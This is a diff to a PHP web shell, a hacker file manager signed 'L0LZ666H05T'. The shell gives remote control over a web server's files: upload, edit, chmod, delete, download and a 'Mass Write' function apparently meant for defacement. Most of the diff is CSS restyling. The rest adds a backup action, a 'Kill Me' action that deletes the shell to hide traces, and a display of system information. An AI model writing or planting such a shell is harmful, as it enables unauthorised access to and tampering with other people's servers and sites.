@@ -22,9 +22,9 @@ table {
   border-collapse: separate;
   border-spacing: 0;
   border: 25px solid #fff;
-  width: 100%;
+  width: 70%;
   margin: 50px auto;
-  border-radius: .25rem;
+  border-radius: 20px;
   box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
 }
 
@@ -73,7 +73,7 @@ textarea {
   margin-bottom:-2px;
   width:100%;
   resize:none;
-  border-radius:3px;
+  border-radius:20px;
   height:400px;
   color:#8a8a8a;
   -moz-border-bottom-colors: none;
@@ -82,10 +82,7 @@ textarea {
   -moz-border-top-colors: none;
   outline:none;
 }
-textarea::-webkit-scrollbar {
-    width: 12px;
-    background:rgba(222,222,222,0.73);
-}
+
 input[type=submit] {
   font-family: 'Ubuntu Mono', monospace;
   padding:5px;
@@ -96,7 +93,7 @@ input[type=submit] {
   margin-bottom:10px;
   color:#8a8a8a;
   font-weight: bold;
-  border-radius:3px;
+  border-radius:20px;
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
 }
@@ -109,7 +106,7 @@ input[type=text] {
   margin-top:10px;
   margin-bottom:10px;
   color:#8a8a8a;
-  border-radius:3px;
+  border-radius:20px;
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
 }
@@ -119,10 +116,10 @@ select {
   margin-right:10px;
   margin-top:10px;
   margin-bottom:10px;
-  padding:5px;
+  padding:5px 10px;
   outline:none;
   color:#8a8a8a;
-  border-radius:3px;
+  border-radius:20px;
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
 }
@@ -165,6 +162,7 @@ th.line {
   margin-bottom:-6px;
   margin-left:-8px;
 }
+a.tools:hover, 
 a.back:hover,
 select:hover, 
 input[type=submit]:hover {
@@ -183,7 +181,7 @@ tr.back {
 a.back {
   font-family: 'Ubuntu Mono', monospace;
   color:#8a8a8a;
-  border-radius:3px;
+  border-radius:20px;
   border:1px solid rgba(222,222,222,0.73);
   background:rgba(222,222,222,0.73);
   padding:5px 30px;
@@ -257,6 +255,19 @@ td.img {
   height: 8px;
   border-radius: 50%;
   background: white;
+}
+a.tools {
+  font-family: 'Ubuntu Mono', monospace;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  padding:7px 20px;
+  outline:none;
+  color:#8a8a8a;
+  border-radius:20px;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
 }
 </style>
 <body>
@@ -598,7 +609,7 @@ function making($post) {
         </td>
         <td>
           <center>
-          <input style="width:98.9%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
+          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
         </center>
         </td>
       </tr>
@@ -689,7 +700,7 @@ function upload($post) {
         <td>
           <center>
           <input type="file" name="file">
-          <input type="submit" name="submit" value="Upload">
+          <input style="width:100px;" type="submit" name="submit" value="Upload">
           </center>
         </td>
       </tr>
@@ -734,7 +745,7 @@ function edit($post, $filename) {
     <form method="post">
       <tr>
         <td>
-          <textarea wrap="off" cols="30" rows="5" name="text"><?php print $text ?></textarea>
+          <textarea name="text"><?php print $text ?></textarea>
         </td>
       </tr>
       <tr>
@@ -779,7 +790,7 @@ function renames($post, $filename) {
     <form method="post">
       <tr>
         <td>
-          <input style="width:98.5%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
+          <input style="width:98.6%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
         </td>
       </tr>
       <tr>
@@ -877,25 +888,62 @@ function download($post, $filename) {
     exit(0);
   }
 }
+function backup($post, $filename) {
+  if ($_GET['do'] == $post) {
+    $file = @file_get_contents($filename);
+    $fp = @fopen($filename.".bak", "w");
+    @fwrite($fp, $file);
+    @fclose($fp);
+  }
+}
+function killme($post) {
+  if ($_GET['do'] == 'killme') {
+    $killme = unlink(@cwd() . DIRECTORY_SEPARATOR .$_SERVER['PHP_SELF']);
+    if ($killme) {
+      ?>
+      <tr>
+        <td colspan="5">
+          <?php print @success("Good Bye :)") ?>
+          <meta http-equiv='refresh' content='1'>
+        </td>
+      </tr>
+      <?php
+    } else {
+      ?>
+      <tr>
+        <td colspan="5">
+          <?php print @failed("Permission Danied") ?>
+        </td>
+      </tr>
+      <?php
+      exit();
+    }
+  }
+}
 if ($_GET['do'] == 'delete') 
 {@delete($_GET['file']);}
 @edit("edit", $_GET['file']);
 @renames("rename", $_GET['file']);
 @chmods("chmod", $_GET['file']);
+@backup("backup", $_GET['file']);
 @download("download", $_GET['file']);
 @upload("upload");
 @making("making");
 @masswriter("masswrite");
+@killme("killme");
 ?>
   <thead>
     <tr>
       <th colspan="5">
-        <select onclick="if (this.value) window.location=(this.value)" style="width:100%;">
-          <option value="" selected>Choose . .</option>
-          <option value="?path=<?php print @cwd() ?>&do=upload">Upload File</option>
-          <option value="?path=<?php print @cwd() ?>&do=making">Make File</option>
-          <option value="?path=<?php print @cwd() ?>&do=masswrite">Mass Write</option>
-      </select>
+        System : <?php print @php_uname() ?>
+      </th>
+    </tr>
+    <tr>
+      <th colspan="5">
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=upload">Upload</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Mass Write</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=killme">Kill Me</a>
       </th>
     </tr>
     <tr>
@@ -1020,6 +1068,7 @@ foreach ($getPATH as $file) {
         <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Rename</option>
         <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Delete</option>
         <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Chmod</option>
+        <option value="?path=<?php print @cwd() ?>&do=backup&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Backup</option>
         <option value="?path=<?php print @cwd() ?>&do=download&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Download</option>
       </select>
       </center>
@@ -1032,7 +1081,7 @@ foreach ($getPATH as $file) {
 </tbody>
 <thead>
     <tr>
-        <th colspan="5" style="border:none;">&copy; <?php print @date("Y") ?> - L0LZ666H05T</th>
+        <th colspan="5" style="border:none;">&copy; 2019/<?php print @date("Y") ?> - L0LZ666H05T</th>
     </tr>
 </thead>
 </table>
